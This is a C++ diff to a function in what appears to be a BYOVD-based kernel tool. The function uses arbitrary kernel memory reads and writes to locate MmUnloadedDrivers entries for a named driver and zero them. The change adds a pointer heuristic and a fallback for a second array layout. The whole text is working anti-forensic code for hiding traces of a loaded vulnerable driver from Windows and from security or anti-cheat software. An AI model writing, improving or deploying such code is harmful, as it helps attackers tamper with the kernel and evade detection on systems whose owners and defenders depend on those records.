@@ -174,24 +174,44 @@ bool ClearUnloadedDriverEntry(byovd::IByovdBackend* backend, const std::wstring&
     }
 
     constexpr size_t ARRAY_SIZE = 50;
-    std::vector<uint64_t> entries(ARRAY_SIZE, 0);
-    if (!backend->ReadKernelMemory(arrayVa, entries.data(), entries.size() * sizeof(uint64_t))) {
-        return false;
-    }
-
     bool found = false;
-    for (size_t i = 0; i < ARRAY_SIZE; ++i) {
-        if (!entries[i]) continue;
-        if (NamesMatch(backend, entries[i], driverName)) {
-            UNLOADED_DRIVER_ENTRY zeroed{};
-            if (backend->WriteKernelMemory(entries[i], &zeroed, sizeof(zeroed))) {
-                uint64_t nullPtr = 0;
-                backend->WriteKernelMemory(arrayVa + i * sizeof(uint64_t), &nullPtr, sizeof(nullPtr));
-                found = true;
-                std::wcout << L"[hinv::cleaner] Erased MmUnloadedDrivers entry #" << i << L" for " << driverName << L"\n";
+
+    // First try: array of pointers to UNLOADED_DRIVER_ENTRY (common layout).
+    std::vector<uint64_t> pointers(ARRAY_SIZE, 0);
+    if (backend->ReadKernelMemory(arrayVa, pointers.data(), pointers.size() * sizeof(uint64_t))) {
+        for (size_t i = 0; i < ARRAY_SIZE; ++i) {
+            if (!pointers[i]) continue;
+            // Heuristic: valid kernel pointer should be in high address space.
+            if (pointers[i] < 0xFFFF000000000000ULL) continue;
+
+            if (NamesMatch(backend, pointers[i], driverName)) {
+                UNLOADED_DRIVER_ENTRY zeroed{};
+                if (backend->WriteKernelMemory(pointers[i], &zeroed, sizeof(zeroed))) {
+                    uint64_t nullPtr = 0;
+                    backend->WriteKernelMemory(arrayVa + i * sizeof(uint64_t), &nullPtr, sizeof(nullPtr));
+                    found = true;
+                    std::wcout << L"[hinv::cleaner] Erased MmUnloadedDrivers entry #" << i << L" for " << driverName << L"\n";
+                }
             }
         }
     }
+
+    // Fallback: array of records directly (some builds use this layout).
+    if (!found) {
+        UNLOADED_DRIVER_ENTRY entries[ARRAY_SIZE]{};
+        if (backend->ReadKernelMemory(arrayVa, entries, sizeof(entries))) {
+            for (size_t i = 0; i < ARRAY_SIZE; ++i) {
+                if (NamesMatch(backend, arrayVa + i * sizeof(UNLOADED_DRIVER_ENTRY) + offsetof(UNLOADED_DRIVER_ENTRY, Name), driverName)) {
+                    UNLOADED_DRIVER_ENTRY zeroed{};
+                    if (backend->WriteKernelMemory(arrayVa + i * sizeof(UNLOADED_DRIVER_ENTRY), &zeroed, sizeof(zeroed))) {
+                        found = true;
+                        std::wcout << L"[hinv::cleaner] Erased MmUnloadedDrivers record #" << i << L" for " << driverName << L"\n";
+                    }
+                }
+            }
+        }
+    }
+
     return found;
 }
 
